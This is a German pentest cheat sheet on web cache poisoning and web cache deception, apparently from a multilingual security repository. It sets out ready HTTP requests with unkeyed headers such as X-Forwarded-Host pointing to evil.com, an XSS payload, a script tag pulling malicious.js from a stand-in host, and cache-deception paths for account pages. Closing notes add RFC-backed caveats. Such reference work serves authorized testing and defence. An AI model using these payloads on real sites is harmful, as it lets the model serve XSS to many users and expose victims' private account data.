# 💾 Cheatsheet zu Web Cache Poisoning

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.it.md">🇮🇹 Versione Italiana</a> | <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
   ██████╗ █████╗  ██████╗██╗  ██╗███████╗    ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ 
  ██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝    ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║██║████╗  ██║██╔════╝ 
  ██║     ███████║██║     ███████║█████╗      ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
  ██║     ██╔══██║██║     ██╔══██║██╔══╝      ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║██║██║╚██╗██║██║   ██║
  ╚██████╗██║  ██║╚██████╗██║  ██║███████╗    ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║██║██║ ╚████║╚██████╔╝
   ╚═════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝    ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

## 🎯 Was ist Cache Poisoning?

Bei **Web Cache Poisoning** (Manipulation eines Webcaches) wird das Cache-Verhalten ausgenutzt, um schädliche Antworten zwischenzuspeichern und an andere Nutzer auszuliefern.

### Auswirkungen
- 🔴 **XSS bei vielen Nutzern** – Gespeichertes XSS an alle Nutzer ausliefern
- 🔴 **Defacement** – Manipulierte Inhalte im Cache speichern
- 🔴 **DoS** – Fehlerantworten im Cache speichern
- 🔴 **Weiterleitungsangriffe** – Nutzer auf andere Ziele weiterleiten

---

## 🔍 Caching verstehen

### Cache-Schlüssel
```
# Typischerweise für den Cache-Schlüssel verwendet:
URL + Host-Header

# NICHT enthalten (unkeyed):
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
Benutzerdefinierte Header
```

### Caching erkennen
```bash
# Auf Cache-Header achten
curl -I https://target.com

# Hinweise auf einen Cache:
X-Cache: HIT
X-Cache-Hits: 5
CF-Cache-Status: HIT
Age: 300
Cache-Control: public, max-age=3600
```

---

## 💉 Unkeyed Header Injection (Header außerhalb des Cache-Schlüssels einschleusen)

### X-Forwarded-Host
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Falls die Antwort evil.com zurückspiegelt:
<script src="//evil.com/malicious.js">
```

### X-Forwarded-Scheme
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: nothttps

# Kann eine Weiterleitung oder Verwechslung des Protokolls auslösen
Location: http://target.com/
```

### X-Host
```http
GET / HTTP/1.1
Host: target.com
X-Host: evil.com

# Auf zurückgespiegelte Werte prüfen
```

### X-Original-URL / X-Rewrite-URL
```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin

# Pfadbeschränkungen umgehen
```

---

## 🔥 Angriffstechniken

### Einfaches XSS durch Cache Poisoning
```http
# 1. Eine Eingabe außerhalb des Cache-Schlüssels finden, die in der Antwort erscheint
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script>

# 2. Die Antwort mit dem XSS-Payload wird zwischengespeichert
# 3. Alle Nutzer erhalten den XSS-Payload aus dem Cache
```

### Cache Poisoning über den Pfad
```http
# Anfrage mit einem abweichenden Pfad am Ursprungsserver
GET /page;evil HTTP/1.1
Host: target.com

# Wird möglicherweise unter einem anderen Schlüssel als erwartet gespeichert
```

### Fat-GET-Anfragen (GET mit Request-Body)
```http
GET / HTTP/1.1
Host: target.com
Content-Length: 25

callback=alert(document.domain)

# Der Body beeinflusst möglicherweise die Antwort, aber nicht den Cache-Schlüssel
```

### Parameter Cloaking (Parameter vor dem Cache verbergen)
```http
# Ruby on Rails
GET /page?param=value;callback=evil HTTP/1.1

# Unterschiedliche Auswertung durch Cache und Anwendung
```

---

## 🛠️ Web Cache Deception

### Unterschied zu Cache Poisoning
```
# Poisoning: Die Nutzlast des Angreifers wird für die Opfer zwischengespeichert
# Deception: Die Daten des Opfers werden für den Angreifer zwischengespeichert

# Ablauf von Web Cache Deception:
1. Das Opfer zum Aufruf dieser URL verleiten: /account/settings.css
2. Der Server liefert /account/settings zurück (ignoriert .css)
3. Der Cache speichert die Antwort als öffentliche Ressource
4. Der Angreifer ruft /account/settings.css aus dem Cache ab
5. Er erhält die sensiblen Daten des Opfers
```

### Payloads
```
/account/settings/x.css
/account/settings/..%2fx.css
/account/settings%3b.css
/account/settings.css
/account/settings/nonexistent.js
```

---

## 📊 Cache-Buster-Technik

### Für Tests
```http
# Einen Cache Buster hinzufügen, um andere Nutzer nicht zu beeinträchtigen
GET /page?cb=random123 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Jeder Test erhält einen eigenen Cache-Schlüssel
```

---

## 🛠️ Werkzeuge

### Param Miner (Burp-Erweiterung)
```
1. Param Miner aus dem BApp Store installieren
2. Rechtsklick auf die Anfrage → Extensions → Param Miner
3. "Guess headers"
4. Nach Headern suchen, die nicht in den Cache-Schlüssel eingehen
```

### Manuelle Tests
```bash
# Header testen
for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Scheme" "X-Original-URL"; do
    echo "Testing: $header"
    curl -H "$header: evil.com" -I https://target.com
done
```

---

## 📋 Häufig nicht im Cache-Schlüssel enthaltene Header

```
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Proto
X-Host
X-Original-URL
X-Rewrite-URL
X-Forwarded-Server
X-HTTP-Method-Override
X-Forwarded-For
True-Client-IP
```

---

## 📚 Ressourcen

- [PortSwigger Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [PortSwigger Research](https://portswigger.net/research/practical-web-cache-poisoning)
- [Web Cache Deception](https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf)

---

## 📝 Ergänzende Hinweise zu den Originalbeispielen

- **Cache-Schlüssel und Wirkung:** Die gezeigte Formel und Headerliste sind vereinfachte Annahmen. Ein HTTP-Cache verwendet mindestens Methode und Ziel-URI; weitere Header können unter anderem über Vary berücksichtigt werden. Eine bestimmte Headerbezeichnung ist daher nicht grundsätzlich unkeyed. Cache Poisoning setzt eine schädlich beeinflussbare Antwort und deren Wiederverwendung unter einem passenden Schlüssel voraus; betroffen sind nicht automatisch alle Nutzer. [RFC 9111, Abschnitt 2](https://www.rfc-editor.org/rfc/rfc9111.html#section-2), [PortSwigger: Cache-Designfehler](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws).
- **Indizien und Cache Buster:** Cache-Control beschreibt die Cachebarkeit, beweist aber keine tatsächliche Speicherung. Auch eine Reflexion allein belegt keine vergiftete Cache-Antwort. Der zusätzliche Parameter isoliert einen Test nur dann, wenn er tatsächlich in den verwendeten Schlüssel eingeht; ein immer wieder verwendeter Wert ist zudem nicht pro Anfrage eindeutig. curl -I prüft eine HEAD-Antwort, nicht die vollständige GET-Auslieferung. [PortSwigger: Cache-Erkennung und Cache Buster](https://portswigger.net/web-security/web-cache-deception#constructing-a-web-cache-deception-attack), [RFC 9110, Abschnitt 9.3.2](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.2).
- **Fat GET und Request-Fragmente:** Das Beispiel nennt Content-Length: 25, während die abgebildete Body-Zeile ohne Zeilenende 31 ASCII-Bytes enthält. Es ist deshalb kein vollständig konsistent gerahmter Request; die ursprünglichen Werte bleiben erhalten. GET-Bodies haben keine allgemein definierte Semantik und werden nicht überall verarbeitet. Auch das Parameter-Cloaking-Beispiel ist ein Fragment und setzt eine konkrete Abweichung zwischen den Parsern voraus; die Rails-Beschriftung ist keine Aussage über jede Version. [RFC 9110, Content-Length](https://www.rfc-editor.org/rfc/rfc9110.html#section-8.6), [RFC 9110, GET](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.1), [PortSwigger: Implementierungsfehler](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws).
- **Cache Deception:** Die Pfade sind Prüffälle, keine universell wirksamen Payloads. Der Datenabfluss erfordert, dass Ursprungsserver und Cache den Pfad unterschiedlich behandeln und die persönliche Antwort anschließend für den Angreifer abrufbar gespeichert wird. Eine Dateiendung allein bewirkt das nicht. [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception).

---

<p align="center">
  <b>💾 Webcaches auf Manipulation prüfen!</b><br>
  <i>Nur für autorisierte Tests!</i>
</p>
